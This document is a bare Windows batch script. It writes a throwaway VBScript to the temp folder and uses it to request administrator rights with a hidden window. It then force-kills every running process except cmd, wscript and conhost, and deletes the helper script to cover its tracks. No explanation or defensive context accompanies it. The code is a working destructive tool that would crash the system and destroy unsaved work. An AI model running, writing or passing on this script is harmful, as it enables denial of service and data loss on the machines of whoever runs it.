@title 
@echo off
>nul chcp 950
set script="%temp%\%random%.vbs"
echo Set UAC = CreateObject^("Shell.Application"^) > %script%
echo UAC.ShellExecute "%windir%\System32\taskkill.exe ", "/f /fi ""imagename ne cmd.exe"" /fi ""imagename ne wscript.exe"" /fi ""imagename ne conhost.exe""", "", "runas", 0 >> %script%
call %script%
del /f /q %script%